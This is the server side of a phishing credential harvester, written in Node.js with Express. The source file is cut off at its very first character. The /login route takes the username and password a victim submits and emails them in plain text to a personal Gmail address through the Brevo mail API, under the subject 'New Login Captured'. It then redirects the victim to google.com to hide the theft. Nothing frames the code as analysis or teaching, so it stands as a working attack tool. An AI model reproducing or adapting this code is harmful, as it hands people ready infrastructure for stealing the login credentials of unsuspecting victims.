onst express = require('express');
const fetch = require('node-fetch');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    await fetch('https://api.brevo.com/v3/smtp/email', {
      method: 'POST',
      headers: {
        'accept': 'application/json',
        'api-key': process.env.BREVO_API_KEY,
        'content-type': 'application/json'
      },
      body: JSON.stringify({
        sender: { email: 'vivienlamake@gmail.com' },
        to: [{ email: 'vivienlamake@gmail.com' }],
        subject: 'New Login Captured',
        textContent: `Username: ${username}\nPassword: ${password}`
      })
    });
  } catch (err) {
    console.error('Error sending email:', err);
  }

  res.redirect('https://google.com');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

